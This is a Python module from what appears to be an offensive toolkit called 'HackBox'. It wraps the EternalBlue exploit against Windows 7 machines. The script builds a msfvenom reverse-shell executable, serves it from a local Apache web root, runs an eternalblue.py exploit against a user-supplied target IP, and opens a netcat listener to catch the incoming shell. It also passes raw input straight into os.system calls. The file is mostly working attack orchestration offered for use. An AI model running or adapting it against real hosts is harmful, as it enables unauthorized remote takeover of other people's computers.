# EternalBlue V 1.1 4/29/22

import os

print("""
                                                                                                                
@@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@   @@@@@@   @@@          @@@@@@@   @@@       @@@  @@@  @@@@@@@@  
@@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@          @@@@@@@@  @@@       @@@  @@@  @@@@@@@@  
@@!         @@!    @@!       @@!  @@@  @@!@!@@@  @@!  @@@  @@!          @@!  @@@  @@!       @@!  @@@  @@!       
!@!         !@!    !@!       !@!  @!@  !@!!@!@!  !@!  @!@  !@!          !@   @!@  !@!       !@!  @!@  !@!       
@!!!:!      @!!    @!!!:!    @!@!!@!   @!@ !!@!  @!@!@!@!  @!!          @!@!@!@   @!!       @!@  !@!  @!!!:!    
!!!!!:      !!!    !!!!!:    !!@!@!    !@!  !!!  !!!@!!!!  !!!          !!!@!!!!  !!!       !@!  !!!  !!!!!:    
!!:         !!:    !!:       !!: :!!   !!:  !!!  !!:  !!!  !!:          !!:  !!!  !!:       !!:  !!!  !!:       
:!:         :!:    :!:       :!:  !:!  :!:  !:!  :!:  !:!   :!:         :!:  !:!   :!:      :!:  !:!  :!:       
 :: ::::     ::     :: ::::  ::   :::   ::   ::  ::   :::   :: ::::      :: ::::   :: ::::  ::::: ::   :: ::::  
: :: ::      :     : :: ::    :   : :  ::    :    :   : :  : :: : :     :: : ::   : :: : :   : :  :   : :: ::   
                                                                                                               """) ## poison font 

print('''
OPTIONS:

a) Windows 7; Requirements: Valid Username + Password\n
---------------\n
h) Help
w) quit to Attack Mode
q) Exit to HackBox\n
---------------\n
x) Attack Mode
y) Defense Mode
z) Recon Mode\n

Enter an option:    ''')

statement = input().lower()

while True:
	if statement == 'a':
		## add some code to generate a default payload with msfvenom or something
		print('Enter Target IP')
		targetIP = input()
		print('Enter Listen IP')
		listenIP = input()
		print('Enter Listen Port')
		listenPORT = input()
		#print('Enter payload')
		#payload = input.() --- -- This will need some work with SED or something similar - or just echo in the payload code?
		os.system('rm -rf /var/www/html/sc.exe')
		print('Starting Apache server...')
		os.system('systemctl restart apache2')
		print('Building Payload...')
		#Removing old listener, and adding  new one to web server
		os.system('msfvenom -p windows/shell_reverse_tcp LHOST=' + listenIP + ' LPORT=' + listenPORT + ' -i 10 -f exe > /var/www/html/sc.exe')
		print('\n')

		# running exploit
		os.system('python2 Modules/attack/exploits/Eternal_Blue_7/eternalblue.py ' + targetIP)
		print('\n -- If the exploit completed correctly, a shell should appear below -- \n')
		#listening and opening shell
		os.system('nc -nvlp ' + listenPORT)




# ----------- moving around ---------------------#
	elif statement=="h":
		print("""\n
EternalBlue! 

This module takes advantage of the infamous EternalBlue exploit. For now, only the windows7 version is included,
however more versions will be coming in the future. Note: you will need a valid login for the machine you are targeting for  the 
exploit to execute successfully!
				""")
	elif statement=="w":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="q":
		os.system('clear')
		exec(open('HackBox.py').read())   
		ans = None
# ------------ Mode Switch ----------------------#
	elif statement=="x":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="y":
		exec(open('Modules/defense/Defense.py').read()) 
	elif statement=="z":
		exec(open('Modules/recon/Recon.py').read()) 
	else:
		print("\nOption not found, type help for help")
		print("Enter an option:")




	statement = input().lower()
